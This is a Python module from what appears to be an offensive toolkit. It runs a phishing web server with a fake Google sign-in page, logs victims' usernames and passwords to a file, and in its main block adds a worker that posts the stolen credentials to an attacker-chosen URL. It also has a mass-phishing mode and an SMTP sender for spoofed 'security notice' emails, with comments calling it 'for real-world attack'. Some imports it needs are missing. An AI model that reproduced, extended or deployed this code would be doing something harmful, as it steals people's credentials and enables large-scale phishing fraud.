# modules/phishing_ext.py

import os
import threading
import datetime
import ssl
import logging
from flask import Flask, request, render_template_string, redirect, abort
from modules.logger import log_event

# ──────────────────────────────────────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────────────────────────────────────

BASE_DIR = os.path.dirname(os.path.realpath(__file__))
TEMPLATE_DIR = os.path.join(BASE_DIR, "phishing_templates")
CERT_DIR = os.path.join(BASE_DIR, "phishing_certs")
CERT_FILE = os.path.join(CERT_DIR, "selfsigned.crt")
KEY_FILE = os.path.join(CERT_DIR, "selfsigned.key")

DEFAULT_HTTP_PORT = 8080
DEFAULT_HTTPS_PORT = 8443

CRED_LOG_PATH = os.path.join(os.path.expanduser("~"), "phish_creds.log")
USE_HTTPS = True   # Set to False to disable HTTPS entirely

# Ensure directories exist
os.makedirs(CREDENTIAL_DIR := os.path.dirname(CRED_LOG_PATH), exist_ok=True)
os.makedirs(TEMPLATE_DIR, exist_ok=True)
os.makedirs(CERT_DIR, exist_ok=True)

# ──────────────────────────────────────────────────────────────────────────────
# Helper to generate self‐signed certificate if missing
# ──────────────────────────────────────────────────────────────────────────────

def generate_self_signed_cert(cert_path: str, key_path: str):
    """
    Generate a self‐signed certificate using openssl command (if available).
    If openssl is not available, logs a warning and skips HTTPS support.
    """
    try:
        if not os.path.exists(cert_path) or not os.path.exists(key_path):
            openssl = shutil.which("openssl")
            if not openssl:
                logging.error("[phishing_ext] OpenSSL not found; HTTPS disabled.")
                return False

            subj = "/C=US/ST=CA/L=SanFrancisco/O=EvilCorp/OU=IT/CN=phish.local"
            cmd = [
                openssl, "req", "-x509", "-nodes", "-days", "365",
                "-newkey", "rsa:2048",
                "-keyout", key_path,
                "-out", cert_path,
                "-subj", subj
            ]
            subprocess.check_call(cmd, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return True
    except Exception as e:
        logging.error(f"[phishing_ext] Failed to generate self‐signed cert: {e}")
        return False

# ──────────────────────────────────────────────────────────────────────────────
# Flask App Initialization
# ──────────────────────────────────────────────────────────────────────────────

try:
    from flask import Flask
except ImportError:
    Flask = None

app = Flask(__name__)

# Ensure credential log file exists
if not os.path.exists(CRED_LOG_PATH):
    open(CRED_LOG_PATH, "w").close()

def log_credentials(phish_type: str, username: str, password: str, client_ip: str):
    """Append stolen creds to a file and to encrypted event log."""
    ts = datetime.datetime.utcnow().isoformat()
    line = f"{ts} | {phish_type.upper()} | IP: {client_ip} | user: {username} | pass: {password}\n"
    try:
        with open(CRED_LOG_PATH, "a") as f:
            f.write(line)
    except Exception as e:
        logging.error(f"[phishing_ext] Failed to write creds log: {e}")
    # Also send to central logger
    log_event({
        "type": "phishing_credential",
        "platform": phish_type,
        "username": username,
        "client_ip": client_ip
    })

def load_templates():
    """
    Load all .html files under phishing_templates/ as named templates.
    Filename (without .html) is the key, and
    url path is '/' + name.
    """
    templates = {}
    for fname in os.listdir(TEMPLATE_DIR):
        if fname.lower().endswith(".html"):
            try:
                with open(os.path.join(TEMPLATE_DIR, fname), "r", encoding="utf-8") as f:
                    templates[fname[:-5]] = f.read()
            except Exception as e:
                logging.warning(f"[phishing_ext] Failed to load template {fname}: {e}")
    if not templates:
        logging.info("[phishing_ext] No templates found; generating default template.")
        templates["google"] = """
<!doctype html>
<title>Google Sign-In</title>
<h2>Sign in – Google Accounts</h2>
<form method="post" action="/google">
  <label>Email:</label><br>
  <input type="text" name="username" style="width:300px"><br><br>
  <label>Password:</label><br>
  <input type="password" name="password" style="width:300px"><br><br>
  <button type="submit" style="width:100px;padding:8px;">Sign In</button>
</form>
"""
    return templates

TEMPLATES = load_templates()

# Dynamically register routes
for name, html_template in TEMPLATES.items():
    url_path = f"/{name}"

    def make_view(phish_name, tmpl):
        def view():
            if Flask is None:
                return "Flask not installed", 500
            if request.method == "GET":
                return render_template_string(tmpl)
            elif request.method == "POST":
                username = request.form.get("username", "")
                password = request.form.get("password", "")
                client_ip = request.remote_addr or "unknown"
                log_credentials(phish_name, username, password, client_ip)
                # Redirect to legit site
                return redirect(f"https://www.{phish_name}.com")
            else:
                abort(405)
        return view

    view_func = make_view(name, html_template)
    app.add_url_rule(rule=url_path, endpoint=name, view_func=view_func, methods=["GET", "POST"])


def start_phishing_server(http_port: int = DEFAULT_HTTP_PORT, https_port: int = DEFAULT_HTTPS_PORT):
    """
    Start the Flask phishing server in a new thread.  
    If USE_HTTPS is True and certs can be generated, also serve on HTTPS.
    """
    if Flask is None:
        logging.error("[phishing_ext] Flask is not installed; cannot start phishing server.")
        return None

    try:
        def run_http():
            log_event({"type": "phishing_server", "action": "start_http", "port": http_port})
            app.run(host="0.0.0.0", port=http_port, debug=False)

        http_thread = threading.Thread(target=run_http, daemon=True)
        http_thread.start()

        if USE_HTTPS and generate_self_signed_cert(CERT_FILE, KEY_FILE):
            def run_https():
                log_event({"type": "phishing_server", "action": "start_https", "port": https_port})
                app.run(host="0.0.0.0", port=https_port, ssl_context=(CERT_FILE, KEY_FILE), debug=False)

            https_thread = threading.Thread(target=run_https, daemon=True)
            https_thread.start()
        return http_thread
    except Exception as e:
        logging.error(f"[phishing_ext] Failed to start phishing server: {e}")
        return None


if __name__ == "__main__":
    print(f"[+] Templates available: {list(TEMPLATES.keys())}")
    print(f"[+] Starting HTTP phishing on port {DEFAULT_HTTP_PORT}")
    start_phishing_server(DEFAULT_HTTP_PORT, DEFAULT_HTTPS_PORT)
    # Enhancement: aggressive mode, exfil, and mass phishing
    import os

    # Dangerous: exfiltrate all collected credentials if env var set
    EXFIL_URL = os.getenv("PHISH_EXFIL_URL")
    if EXFIL_URL:
        def exfil_worker():
            import time, requests
            sent = set()
            while True:
                try:
                    if os.path.exists(CRED_LOG_PATH):
                        with open(CRED_LOG_PATH, "r") as f:
                            lines = f.readlines()
                        for line in lines:
                            if line not in sent:
                                requests.post(EXFIL_URL, data={"cred": line}, timeout=5)
                                sent.add(line)
                except Exception as e:
                    logging.error(f"[phishing_ext] Exfiltration failed: {e}")
                time.sleep(30)
        threading.Thread(target=exfil_worker, daemon=True).start()

    # Dangerous: mass phishing mode (serve all templates on all ports in range if env set)
    MASS_PORTS = os.getenv("PHISH_MASS_PORTS")
    if MASS_PORTS:
        ports = [int(p) for p in MASS_PORTS.split(",") if p.strip().isdigit()]
        for p in ports:
            threading.Thread(target=start_phishing_server, args=(p, p+4000), daemon=True).start()
        logging.info(f"[phishing_ext] Mass phishing servers started on ports: {ports}")

    # Enhancement: phishing email sender for real-world attack
    PHISH_EMAIL_TARGETS = os.getenv("PHISH_EMAIL_TARGETS")
    PHISH_EMAIL_TEMPLATE = os.getenv("PHISH_EMAIL_TEMPLATE")
    PHISH_EMAIL_SUBJECT = os.getenv("PHISH_EMAIL_SUBJECT", "Important Security Notice")
    PHISH_EMAIL_FROM = os.getenv("PHISH_EMAIL_FROM", "security@support.com")
    PHISH_EMAIL_SMTP = os.getenv("PHISH_EMAIL_SMTP")
    PHISH_EMAIL_SMTP_PORT = int(os.getenv("PHISH_EMAIL_SMTP_PORT", "25"))
    PHISH_EMAIL_SMTP_USER = os.getenv("PHISH_EMAIL_SMTP_USER")
    PHISH_EMAIL_SMTP_PASS = os.getenv("PHISH_EMAIL_SMTP_PASS")
    PHISH_EMAIL_LINK = os.getenv("PHISH_EMAIL_LINK", f"http://localhost:{DEFAULT_HTTP_PORT}/google")

    if PHISH_EMAIL_TARGETS and PHISH_EMAIL_TEMPLATE and PHISH_EMAIL_SMTP:
        def send_phish_emails():
            targets = [t.strip() for t in PHISH_EMAIL_TARGETS.split(",") if t.strip()]
            try:
                with open(PHISH_EMAIL_TEMPLATE, "r", encoding="utf-8") as f:
                    template = f.read()
            except Exception as e:
                print(f"[!] Failed to read phishing email template: {e}")
                return
            for target in targets:
                msg = MIMEMultipart()
                msg["From"] = PHISH_EMAIL_FROM
                msg["To"] = target
                msg["Subject"] = PHISH_EMAIL_SUBJECT
                body = template.replace("{{PHISH_LINK}}", PHISH_EMAIL_LINK)
                msg.attach(MIMEText(body, "html"))
                try:
                    smtp = smtplib.SMTP(PHISH_EMAIL_SMTP, PHISH_EMAIL_SMTP_PORT, timeout=10)
                    if PHISH_EMAIL_SMTP_USER and PHISH_EMAIL_SMTP_PASS:
                        smtp.login(PHISH_EMAIL_SMTP_USER, PHISH_EMAIL_SMTP_PASS)
                    smtp.sendmail(PHISH_EMAIL_FROM, target, msg.as_string())
                    smtp.quit()
                except Exception as e:
                    logging.error(f"[phishing_ext] Failed to send phishing email to {target}: {e}")
        threading.Thread(target=send_phish_emails, daemon=True).start()
